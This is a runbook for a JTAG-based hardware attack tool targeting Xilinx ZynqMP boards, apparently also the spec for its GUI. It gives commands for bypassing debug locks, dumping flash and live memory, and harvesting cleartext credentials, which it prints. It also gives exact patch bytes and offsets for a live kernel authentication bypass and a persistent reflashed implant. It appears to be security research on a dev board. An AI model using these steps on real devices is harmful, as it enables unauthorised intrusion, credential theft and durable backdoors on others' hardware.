# Playbook — Open-DAP ZynqMP Engagement (ZCU102, validated)

**Purpose.** The repeatable, end-to-end runbook for an open-JTAG ZynqMP engagement:
first contact → extract → analyze → exploit → persist. Every step here was **executed
on real hardware** (ZCU102, S/N 210308BD8D4D, onboard FT4232 over one USB cable,
2026-08-14) — the outputs shown are real.

**This is also the GUI spec.** The Qt app (`gui-spike/`, see `project_gui_direction`)
drives exactly this flow: each Phase maps to a screen/panel action, and the "GUI action"
line under each step is what the button does. The access-tier gating in the Capabilities
panel is the "Decision gate" logic below.

Adapter for this board = **onboard FTDI (`ftdi` OpenOCD driver)** — no SmartLynq2 / hw_server
needed (that path is for other boards; see `docs/transport/adapter-catalog.md`).

Operator note: the user drives live JTAG. In this session they ran commands via the `!`
prefix / manual mode. All live commands below are `openocd -f openocd/zcu102.cfg …`.

> **⚠ SCOPE — this is the EASY case.** This ZCU102 is a factory dev board with **every
> security bit open**, so Phases 3–8 (extract → analyze → exploit) run unobstructed. **In
> the field, most targets are LOCKED/SECURED**, and the real work — the headline value of
> this tool — is **Phase 2b: getting from LOCKED to enough access to do Phases 3–8.** That
> is the unlock / reconfigure / bypass problem. The open board just proves the *downstream*
> chain works once you're in; it does not represent a real engagement's difficulty.

---

## Phase 0 — Setup
- Board powered on; USB (onboard FT4232) connected; operator in `dialout` group.
- `lsusb` shows an FTDI device (VID `0403`).
- **GUI action:** "Connect" → auto-detect adapter (USB VID/PID → backend), pick `zcu102.cfg`.

## Phase 1 — First contact (chain discovery)
```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/discover.tcl; shutdown"
```
- **Expect:** 2 TAPs — PS `0x24738093` (Xilinx ZynqMP, part 0x4738) + ARM DAP `0x5ba00477`;
  APs: AP0 AXI MEM-AP, AP1 APB MEM-AP, AP2 JTAG-AP.
- **Decision gate:** no chain → permissions / `cp210x` grabbing the port / wiring. Stop here.
- **GUI action:** Chain tree in the "Adapter & Target" panel; ✔ when 2 TAPs + AXI MEM-AP.

## Phase 2 — Access verdict
```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/jtag-access-check.tcl; shutdown"
```
- **Expect:** `ACCESS VERDICT: OPEN` — DP CTRL/STAT `0xf0000001` (debug+sys power acked, no
  sticky faults), MEM-APs respond, NS regs read (`BOOT_MODE_USER` = boot-mode strap).
- **Decision gate:** verdict < OPEN on a production board is itself the result (controls
  working) → try `reopen-debug` levers; on a dev board expect OPEN.
- **GUI action:** the OPEN/RESTRICTED/LOCKED badge; **gates every capability below.**

## Phase 2b — LOCKED: the unlock / reconfigure decision tree  ⟵ THE REAL WORK
When Phase 2 returns **RESTRICTED / LOCKED / NO-DAP** (the common field case), the effort is
here: classify *what* is locked and *how it is enforced*, then pick a path back to access.
Enumerate first (Phase 3 still reads whatever is reachable), then triage each lock.

**Automated:** `tools/unlock-engine.py` turns the posture into a ranked, enforcement-classified
unlock plan (the tree below, as data). E.g. `--soc zynqmp --jtag-locked --no-efuse-jtag-dis` →
a high-confidence AUTO software lever first; `--efuse-jtag-dis` → no lever, straight to
alternate-path/physical/glitch. `--json` feeds the GUI's "Reopen / Unlock" panel.

**Classify the enforcement (this decides everything):**
- **Software register gate** (CSU `JTAG_SEC` / `JTAG_DAP_CFG` / debug-enable, writable) →
  **reversible now.** Try the reopen levers: `openocd/reopen-debug.tcl` (and per-SoC variants,
  e.g. `zynq7000-reopen-debug.tcl`) write the gate open; read back to confirm. **Biggest win —
  a misconfigured board that *looks* locked but isn't eFuse-sealed.**
- **eFuse-enforced** (`SEC_CTRL` jtag_dis/dft_dis, RSA/AES enable) → **NOT software-reversible.**
  Needs a hardware bypass (glitch/SCA/physical) or an alternate path below.
- **Runtime lock** (firmware disables JTAG after boot) → win the race before the lock, or
  reach it via a different master.

**Partial-lock / misconfig hunting (cheap, high-yield):** enumeration exposes gaps a real
board often ships with — NS-DAP left enabled, one debug gate not sealed, secure-boot on but
JTAG open, encrypt-only (no auth). `tools/cve-match.py` maps the exact posture to what applies.

**Alternate access paths (when the DAP itself is shut):**
- **PMU MicroBlaze** — `openocd/open-pmu-tap.tcl` opens `JTAG_SEC.SSSS_PMU_SEC` (writable ⇒
  unsealed) + `zcu102-3tap.cfg` inserts the BSCAN TAP → a master that reaches ROM/bus the DAP can't.
- **Boundary scan** (EXTEST/SAMPLE via the part's BSDL) — often alive even when the debug DAP is
  gated; read/drive pins.
- **CSU surface** — `probe-csu-surface.tcl` / `probe-csu-fullmap.tcl` map the crypto/DMA engines.
- **BootROM** — `bootrom-fuzz-*` (malformed boot header → CSU reaction fingerprint; checkm8-model).

**Physical / offline bypass (JTAG not required):**
- **Dump the boot flash directly** — SOIC-8 clip + `flashrom` on the external QSPI/eMMC → get the
  (possibly encrypted) image without touching JTAG, then attack it offline. Often the fastest win.
- Attack a captured secure image: JustSTART (CVE-2023-20570 RSA-auth bypass), GHASH/Starbleed-class
  AES-GCM malleability, encrypt-only downgrade — see `docs/15`.

**Hardware fault injection / side-channel (the eFuse-sealed case — tooling GAP):**
- **Glitch** (voltage/EM/clock, e.g. ChipWhisperer/PicoEMP) the CSU security check — the eFuse
  read, the auth compare, or the secure-boot decision — to skip it. This is the primary technique
  for a properly-locked board and is **not yet integrated** (needs a glitcher + trigger).
- **SCA/DPA** to recover the AES boot key (ZU+ EM-SCA, `docs/15`) — needs scope/EM probe.

**Decision gate → GUI:** the "Reopen / Unlock" panel is the headline surface — take the verdict +
posture, render a **per-lock breakdown with an enforcement tag and a ranked strategy list**:
auto-tryable software levers first, then alternate-path scripts, then guided hardware procedures
(FI/SCA/flashrom). Reaching OPEN here is the deliverable; Phases 3–8 are the payoff that follows.

## Phase 3 — Security-posture enumeration
```bash
openocd -f openocd/zcu102.cfg -c "init; source openocd/enumerate.tcl; shutdown"
python3 tools/interpret.py "$(ls -t reports/raw-*.json | head -1)" -O
```
- **Expect:** `reports/raw-*.json` (656 regs) + interpreted report; all-open dev baseline.
  Script auto-detects a **live OS on the A53** and skips its reset-reassert.
- **GUI action:** "Enumerate posture" → the Posture table + ring/meter (open vs hardened).

## Phase 4 — Flash extraction (the boot image)
```bash
QSPI_OP=dmadump QSPI_SIZE=0xC00000 QSPI_OUT=dumps/boot.bin \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/qspi-jtag.tcl; shutdown"
python3 tools/parse-bootimage.py dumps/boot.bin --extract dumps/qspi-parts/
```
- **Method:** drives the GQSPI controller via AXI MMIO → DMA flash to a free DDR scratch →
  block-read. No halt, no boot-strap change. ~34 KB/s (12 MB ≈ 6 min).
- **Result (this board):** `dumps/boot.bin` (12 MB), **unsigned + unencrypted**, 3 partitions
  extracted: BL31 (→OCM), FSBL (→OCM), **10.6 MB VxWorks app (→DDR 0x100000)**.
- **GUI action:** "Dump flash" (tier-e/c capability) → progress bar → auto-run parse-bootimage.

## Phase 5 — Live memory extraction
```bash
DUMP_ADDR=0x00100000 DUMP_SIZE=0x01000000 DUMP_HALT=1 DUMP_OUT=dumps/os-live.bin \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/dump-os-ddr.tcl; shutdown"
python3 tools/dram-secrets.py dumps/os-live.bin --base 0x100000 -o reports/dram-secrets.md
```
- **⚠ Halts the A53 cores** for the read (resumed after). Reads live DDR via AXI-AP.
- **Result (this board):** `dumps/os-live.bin` (16 MB) → **cleartext credentials**:
  `u=target/pw=vxTarget`, `u=ultraNP/pw=ultraNP` — present in BOTH live RAM AND the flash
  image (hardcoded in firmware).
- **GUI action:** "Dump DDR/OCM" (warns on OS-halt) → auto-run dram-secrets → findings list.

## Phase 6 — Reverse-engineering setup
```bash
P2=dumps/qspi-parts/part2_num0_NONE_kernel-or-app_load0x00100000.bin
python3 tools/vxworks-symtab.py "$P2" --out-map dumps/symbols.txt
python3 tools/ghidra-loadspec.py "$P2"
```
- **Result:** **16,331 VxWorks symbols** (VA base `0xFFFFFFFF80100000`); Ghidra load spec
  = Raw Binary / **AARCH64:LE:64** / base `0xFFFFFFFF80100000`; `vxworks_symbols_ghidra.py`
  import script; `dumps/symbols.txt` symbol map.
- **GUI action:** "Set up disassembly" → shows load spec, writes symbol map + Ghidra script.

## Phase 7 — Target identification
```bash
grep -iE 'login|auth|passwd|secur' dumps/symbols.txt
python3 tools/find-patch-target.py "$P2" --va-base 0xFFFFFFFF80100000 --img-base 0 --top 15
python3 tools/symbol-crypto.py dumps/os-live.bin --syms dumps/symbols.txt \
  --va-base 0xFFFFFFFF80100000 --load-pa 0x100000 --dump-base 0x100000 -o reports/sym-crypto.md
```
- **Result:** auth path = `ipcom_auth_login` @ `0xFFFFFFFF8023CE14`, `shellLogin`,
  `SecurityIsEnabled`; `'auth failed'` string @ `0xFFFFFFFF80928678`; an app-layer
  `OE_/coe` encryption stack; **no static AES keys** in the 16 MB window.
- **GUI action:** symbol browser + "Find patch targets" → ranked list feeding Phase 8.

## Phase 8 — Exploitation
### 8a. Cap-2 — live-kernel patch (transient, proven)
```bash
python3 tools/patch-recipe.py --arch aarch64 --behavior ret0 \
  --func ipcom_auth_login --syms dumps/symbols.txt --pa-math linear
# -> PATCH_VA=0xffffffff8023ce14 PATCH_HEX=00008052c0035fd6
PATCH_VA=0xffffffff8023ce14 PATCH_HEX=00008052c0035fd6 PATCH_HALT=0 PATCH_RESTORE=0 \
  openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
```
- **VA→PA:** `PA = (VA & 0xFFFFFFFF) − 0x80000000` (default `PATCH_KVA_LO`) = `0x23CE14`. ✓
- **Use `PATCH_HALT=0`** (pure AXI-AP, no core touch) on a VMware-passthrough DAP — no wedge.
- **Result (this board):** RO kernel `.text` overwritten with `mov w0,#0; ret` — **PROVEN**.
- **Caveat:** I-cache may hold the old instruction → running instance may not execute the
  patch until refill. For a *guaranteed* bypass use 8b. Recover: power-cycle or `PATCH_RESTORE=1`.
- **GUI action:** "Live-patch" → pick target + behavior → recipe preview → write + read-back diff.

### 8b. Cap-3 — persistent implant (reflash, survives reboot)
```bash
# file offset = partition-2 file off (0x50C80) + (VA − VAbase) → 0x18DA94
python3 tools/repack-bootimage.py dumps/boot.bin --patch 0x18DA94=00008052c0035fd6 \
  -o dumps/boot-patched.bin
python3 tools/parse-bootimage.py dumps/boot-patched.bin        # checksums must stay OK
# reflash (DESTRUCTIVE — operator choice): SD BOOT partition, or qspi-jtag QSPI_OP=write
```
- **Result (this board):** `dumps/boot-patched.bin` — `ipcom_auth_login`→`ret0` baked in,
  BH/IHT/PHT checksums recomputed (all OK), partition-2 `plain` → reflash-valid.
- **GUI action:** "Build persistent implant" → offset auto-computed from the Phase-7 target →
  repack → verify → present the reflash options (destructive, explicit confirm).

---

## Capability ladder (what each phase reaches — the GUI's tier model)
`a` chain/IDCODE (Ph1) → `b` boundary-scan → `c` mem-AP dump (Ph4/5) → `d` run-control
(halt in Ph5) → `e` exploitation (Ph8). ZCU102 open-DAP reaches **e**.

## Recovery
- DAP wedge (DTR): power-cycle the board.
- Live patch left in place: power-cycle (reloads clean QSPI) or `PATCH_RESTORE=1`.
- All dumps are already on disk before any state-changing step.
